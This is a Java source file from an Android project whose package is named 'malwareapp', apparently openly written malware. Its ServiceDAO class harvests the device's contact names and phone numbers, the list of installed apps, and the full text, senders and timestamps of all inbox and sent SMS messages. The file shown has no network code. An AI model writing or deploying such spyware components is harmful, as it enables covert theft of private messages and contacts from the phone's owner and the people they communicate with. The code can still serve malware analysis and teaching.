package com.example.malwareapp;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.CellInfo;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

import com.example.malwareapp.model.AppInfo;
import com.example.malwareapp.model.ContactsInfo;
import com.example.malwareapp.model.SmsInfo;

import java.util.ArrayList;
import java.util.List;

public class ServiceDAO {
    @SuppressLint("Range")
    public List<ContactsInfo> getContactList(ContentResolver cr) {

        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        List<ContactsInfo> result = new ArrayList<>();
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                        result.add(new ContactsInfo(name, phoneNo));

                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }

        return result;
    }

    public List<AppInfo> getInstalledApps(PackageManager pm) {
        //get a list of installed apps.
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        List<AppInfo> result = new ArrayList<>();

        for (ApplicationInfo packageInfo : packages) {

            result.add(new AppInfo(packageInfo.packageName, packageInfo.sourceDir));
        }

        return result;
    }

    @SuppressLint("Range")
    public List<SmsInfo> getSms(ContentResolver cr) {
        List<SmsInfo> lstSms = new ArrayList<SmsInfo>();
        SmsInfo objSms;
        Uri message = Uri.parse("content://sms/");

        Cursor c = cr.query(message, null, null, null, null);
        //mActivity.startManagingCursor(c);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {

                objSms = new SmsInfo();
                objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));
                objSms.setAddress(c.getString(c
                        .getColumnIndexOrThrow("address")));
                objSms.setMessage(c.getString(c.getColumnIndexOrThrow("body")));
                objSms.setReadState(c.getString(c.getColumnIndex("read")));
                objSms.setTime(c.getString(c.getColumnIndexOrThrow("date")));
                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                    objSms.setFolderName("inbox");
                } else {
                    objSms.setFolderName("sent");
                }

                lstSms.add(objSms);
                c.moveToNext();
            }
        }
        else {
        // throw new RuntimeException("You have no SMS");
        }
        c.close();

        return lstSms;
    }
}
